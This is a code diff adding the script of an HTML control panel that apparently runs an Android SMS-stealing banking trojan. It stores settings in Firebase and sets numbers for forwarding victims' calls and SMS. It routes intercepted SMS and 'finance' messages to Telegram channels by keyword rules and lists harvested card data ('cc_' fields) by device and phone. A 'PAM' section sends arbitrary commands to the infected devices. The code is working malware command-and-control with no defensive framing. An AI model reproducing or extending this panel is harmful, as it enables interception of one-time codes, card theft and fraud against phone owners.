+        } catch (e) {
+          toast("Save failed", e.message);
+        }
+      });
+
+      // ---- Forward / Telegram ----
+      async function fetchForward() {
+        const url = buildUrl("config/forwardDefaults");
+        const el = document.getElementById("fwdInfo");
+        if (!url) {
+          el.textContent = "Set Firebase URL/secret";
+          return;
+        }
+        try {
+          const r = await fetch(url, { cache: "no-store" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          const data = (await r.json()) || {};
+          document.getElementById("fwdCall").value = data.callNumber || "";
+          document.getElementById("fwdSms").value = data.smsNumber || "";
+          el.textContent =
+            "Loaded " +
+            (data.updatedAt
+              ? new Date(data.updatedAt).toLocaleString("en-IN")
+              : "");
+        } catch (e) {
+          el.textContent = "Load failed: " + e.message;
+        }
+      }
+      document
+        .getElementById("fwdRefresh")
+        ?.addEventListener("click", fetchForward);
+      document
+        .getElementById("fwdSave")
+        ?.addEventListener("click", async () => {
+          const callN = document.getElementById("fwdCall").value.trim();
+          const smsN = document.getElementById("fwdSms").value.trim();
+          const url = buildUrl("config/forwardDefaults");
+          try {
+            const r = await fetch(url, {
+              method: "PATCH",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                callNumber: callN,
+                smsNumber: smsN,
+                updatedAt: Date.now(),
+              }),
+            });
+            if (!r.ok) throw new Error("HTTP " + r.status);
+            toast("Saved", "forwardDefaults");
+          } catch (e) {
+            toast("Save failed", e.message);
+          }
+        });
+
+      // ---- Telegram channels (pure REST via ?auth=API_KEY) ----
+      async function fetchTelegramChannels() {
+        const uid = document.getElementById("tgUserId").value.trim();
+        if (!uid) {
+          toast("Enter Telegram ID", "for personal channels");
+          return;
+        }
+        // personal
+        try {
+          const r = await fetch(buildUrl(`config/userChannels/${uid}/sms`), {
+            cache: "no-store",
+          });
+          const j = await r.json();
+          const v = typeof j === "string" ? j : (j && j.channelId) || j || "";
+          const val = typeof v === "string" ? v : "";
+          document.getElementById("personalChannel").value = val;
+          document.getElementById("personalInfo").textContent = val
+            ? "Loaded: " + val
+            : "Not set";
+        } catch (e) {
+          document.getElementById("personalInfo").textContent =
+            "Load failed: " + e.message;
+        }
+        try {
+          const r = await fetch(
+            buildUrl(`config/userChannels/${uid}/finance`),
+            { cache: "no-store" }
+          );
+          const j = await r.json();
+          const val = typeof j === "string" ? j : (j && j.channelId) || j || "";
+          const v = typeof val === "string" ? val : "";
+          document.getElementById("financeChannel").value = v;
+          document.getElementById("financeInfo").textContent = v
+            ? "Loaded: " + v
+            : "Not set";
+        } catch {}
+        try {
+          const r = await fetch(buildUrl(`config/userChannels/${uid}/rules`), {
+            cache: "no-store",
+          });
+          const data = await r.json();
+          const listEl = document.getElementById("rulesList");
+          if (
+            !data ||
+            typeof data !== "object" ||
+            Object.keys(data).length === 0
+          ) {
+            listEl.innerHTML = '<div class="small">No rules</div>';
+          } else {
+            listEl.innerHTML = Object.entries(data)
+              .map(
+                ([k, v]) =>
+                  `<div class="dev" style="justify-content:space-between"><span class="badge">${esc(v.keyword || k)}</span><span class="mono small">${esc(v.channel || "")}</span><button class="btn bad" style="padding:4px 8px" onclick="window._delRule('${esc(k)}')">Del</button></div>`
+              )
+              .join("");
+          }
+        } catch (e) {
+          document.getElementById("rulesList").textContent =
+            "Load failed: " + e.message;
+        }
+        // global
+        try {
+          const r = await fetch(buildUrl("config/smsChannel"), {
+            cache: "no-store",
+          });
+          const j = await r.json();
+          const val = typeof j === "string" ? j : (j && j.channelId) || j || "";
+          const v = typeof val === "string" ? val : "";
+          document.getElementById("globalChannel").value = v;
+          document.getElementById("globalInfo").textContent = v
+            ? "Loaded: " + v
+            : "Not set";
+        } catch {}
+      }
+      window._delRule = async (k) => {
+        const uid = document.getElementById("tgUserId").value.trim();
+        if (!uid) return;
+        if (!confirm("Delete rule " + k + "?")) return;
+        try {
+          const r = await fetch(
+            buildUrl(`config/userChannels/${uid}/rules/${k}`),
+            { method: "DELETE" }
+          );
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          toast("Deleted", k);
+          fetchTelegramChannels();
+        } catch (e) {
+          toast("Delete failed", e.message);
+        }
+      };
+      document
+        .getElementById("tgLoad")
+        ?.addEventListener("click", fetchTelegramChannels);
+      document
+        .getElementById("savePersonal")
+        ?.addEventListener("click", async () => {
+          const uid = document.getElementById("tgUserId").value.trim();
+          const val = document.getElementById("personalChannel").value.trim();
+          if (!uid) {
+            toast("Missing", "Telegram ID");
+            return;
+          }
+          const url = buildUrl(`config/userChannels/${uid}/sms`);
+          try {
+            const r = await fetch(url, {
+              method: "PUT",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(val || null),
+            });
+            if (!r.ok) throw new Error("HTTP " + r.status);
+            toast("Saved", "personal channel");
+          } catch (e) {
+            toast("Save failed", e.message);
+          }
+        });
+      document
+        .getElementById("clearPersonal")
+        ?.addEventListener("click", async () => {
+          const uid = document.getElementById("tgUserId").value.trim();
+          if (!uid) return;
+          try {
+            const r = await fetch(buildUrl(`config/userChannels/${uid}/sms`), {
+              method: "DELETE",
+            });
+            if (!r.ok) throw new Error("HTTP " + r.status);
+            document.getElementById("personalChannel").value = "";
+            toast("Cleared", "personal");
+          } catch (e) {
+            toast("Clear failed", e.message);
+          }
+        });
+      document
+        .getElementById("saveFinance")
+        ?.addEventListener("click", async () => {
+          const uid = document.getElementById("tgUserId").value.trim();
+          const val = document.getElementById("financeChannel").value.trim();
+          if (!uid) return;
+          try {
+            const r = await fetch(
+              buildUrl(`config/userChannels/${uid}/finance`),
+              {
+                method: "PUT",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(val || null),
+              }
+            );
+            if (!r.ok) throw new Error("HTTP " + r.status);
+            toast("Saved", "finance");
+          } catch (e) {
+            toast("Save failed", e.message);
+          }
+        });
+      document
+        .getElementById("clearFinance")
+        ?.addEventListener("click", async () => {
+          const uid = document.getElementById("tgUserId").value.trim();
+          if (!uid) return;
+          try {
+            const r = await fetch(
+              buildUrl(`config/userChannels/${uid}/finance`),
+              { method: "DELETE" }
+            );
+            if (!r.ok) throw new Error("HTTP " + r.status);
+            document.getElementById("financeChannel").value = "";
+            toast("Cleared", "finance");
+          } catch (e) {
+            toast("Clear failed", e.message);
+          }
+        });
+      document
+        .getElementById("addRule")
+        ?.addEventListener("click", async () => {
+          const uid = document.getElementById("tgUserId").value.trim();
+          const kw = document.getElementById("ruleKeyword").value.trim();
+          const ch = document.getElementById("ruleChannel").value.trim();
+          if (!uid || !kw || !ch) {
+            toast("Missing", "id/keyword/channel");
+            return;
+          }
+          const key = kw.toLowerCase().replace(/\s+/g, "_");
+          try {
+            const r = await fetch(
+              buildUrl(`config/userChannels/${uid}/rules/${key}`),
+              {
+                method: "PUT",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ keyword: kw, channel: ch }),
+              }
+            );
+            if (!r.ok) throw new Error("HTTP " + r.status);
+            document.getElementById("ruleKeyword").value = "";
+            document.getElementById("ruleChannel").value = "";
+            toast("Added", kw);
+            fetchTelegramChannels();
+          } catch (e) {
+            toast("Add failed", e.message);
+          }
+        });
+      document
+        .getElementById("saveGlobal")
+        ?.addEventListener("click", async () => {
+          const val = document.getElementById("globalChannel").value.trim();
+          const url = buildUrl("config/smsChannel");
+          try {
+            const r = await fetch(url, {
+              method: "PUT",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(val || null),
+            });
+            if (!r.ok) throw new Error("HTTP " + r.status);
+            toast("Saved", "global");
+          } catch (e) {
+            toast("Save failed", e.message);
+          }
+        });
+      document
+        .getElementById("clearGlobal")
+        ?.addEventListener("click", async () => {
+          try {
+            const r = await fetch(buildUrl("config/smsChannel"), {
+              method: "DELETE",
+            });
+            if (!r.ok) throw new Error("HTTP " + r.status);
+            document.getElementById("globalChannel").value = "";
+            toast("Cleared", "global");
+          } catch (e) {
+            toast("Clear failed", e.message);
+          }
+        });
+
+      // ---- PAM / Tool via /api (uses Bearer if present) ----
+      function authHeaders() {
+        try {
+          const raw = localStorage.getItem("cyberzone_auth");
+          if (!raw) return {};
+          const p = JSON.parse(raw);
+          if (p.telegramId && p.sessionId)
+            return { Authorization: `Bearer ${p.telegramId}:${p.sessionId}` };
+        } catch {}
+        return {};
+      }
+      async function fetchPam() {
+        const out =
+          document.getElementById("pamOut") ||
+          document.getElementById("pamList2");
+        if (!out) return;
+        out.textContent = "Loading…";
+        try {
+          const r = await fetch("/api/pam/status", { headers: authHeaders() });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          const j = await r.json();
+          out.textContent = JSON.stringify(j, null, 2);
+        } catch (e) {
+          out.textContent =
+            "Failed: " +
+            e.message +
+            "\n(will try REST fallback if /api blocked)";
+        }
+      }
+      document.getElementById("pamStatus")?.addEventListener("click", fetchPam);
+      document
+        .getElementById("pamRefresh2")
+        ?.addEventListener("click", fetchPam);
+      document.getElementById("pamRun")?.addEventListener("click", async () => {
+        const cmd = document.getElementById("pamCmd").value.trim();
+        if (!cmd) return;
+        const out = document.getElementById("pamOut");
+        out.textContent = "Running…";
+        try {
+          const r = await fetch("/api/pam/exec", {
+            method: "POST",
+            headers: { "Content-Type": "application/json", ...authHeaders() },
+            body: JSON.stringify({ command: cmd }),
+          });
+          const j = await r.json();
+          out.textContent = JSON.stringify(j, null, 2);
+        } catch (e) {
+          out.textContent = "Failed: " + e.message;
+        }
+      });
+
+      // ---- Data / Cards ----
+      function renderData() {
+        const q = (document.getElementById("dataQ").value || "").toLowerCase();
+        const el = document.getElementById("dataList");
+        let list = devices.filter((d) => {
+          const has = Object.keys(d.raw).some(
+            (k) => k.startsWith("cc_") || k === "cards" || k === "cc"
+          );
+          return has;
+        });
+        if (q)
+          list = list.filter((d) =>
+            (d.phone + d.model + d.upi + d.id).toLowerCase().includes(q)
+          );
+        if (list.length === 0) {
+          el.innerHTML = '<div class="small">No cards data.</div>';
+          return;
+        }
+        el.innerHTML = list
+          .map((d) => {
+            const cards = Object.entries(d.raw).filter(
+              ([k]) => k.startsWith("cc_") || k === "cards"
+            );
+            return `<div class="card" style="margin-bottom:8px"><div class="mono small">${esc(d.id)} · ${esc(d.model)}</div><div class="small">${esc(d.phone)} · ${esc(d.group || "")}</div><div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap">${cards.map(([k, v]) => `<span class="badge">${esc(k)}: ${esc(String(v).slice(0, 30))}</span>`).join("") || '<span class="small">no cc_ keys</span>'}</div></div>`;
+          })
+          .join("");
+      }
+      document.getElementById("dataQ")?.addEventListener("input", renderData);
+      document
+        .getElementById("dataRefresh")
+        ?.addEventListener("click", renderData);
+
+      loadCfg();
+      startPolling();
+      renderFleet();
+      toast("Pure panel ready", "REST + secret · setInterval 3s");
+    </script>
+  </body>
+</html>
